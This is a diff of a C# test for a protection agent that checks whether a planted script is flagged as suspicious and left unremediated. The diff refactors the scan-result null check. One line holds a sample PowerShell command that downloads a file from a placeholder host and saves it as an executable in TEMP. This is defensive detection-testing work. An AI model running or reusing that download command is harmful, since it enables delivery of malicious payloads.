@@ -62,10 +62,12 @@ internal static class Program
                 "Invoke-WebRequest 'https://example.invalid/file' -OutFile $env:TEMP+'\\x.exe'");
 
             ProtectionAgentEvent10 result = await suspiciousScanned.Task.WaitAsync(TimeSpan.FromSeconds(20));
-            Ensure(result.ScanResult is not null, "Risultato scansione automatica mancante.");
-            Ensure(result.ScanResult.Verdict is ThreatVerdict10.Suspicious or ThreatVerdict10.Malicious,
-                $"Lo script doveva risultare almeno sospetto, ottenuto: {result.ScanResult.Verdict}.");
-            Ensure(result.ScanResult.Confidence > 0, "La scansione automatica non ha prodotto un punteggio.");
+            FileScanResult10 scanResult = result.ScanResult
+                ?? throw new InvalidOperationException("Risultato scansione automatica mancante.");
+
+            Ensure(scanResult.Verdict is ThreatVerdict10.Suspicious or ThreatVerdict10.Malicious,
+                $"Lo script doveva risultare almeno sospetto, ottenuto: {scanResult.Verdict}.");
+            Ensure(scanResult.Confidence > 0, "La scansione automatica non ha prodotto un punteggio.");
             Ensure(File.Exists(suspicious), "L'agente non deve applicare remediation automatica.");
 
             await agent.StopAsync();
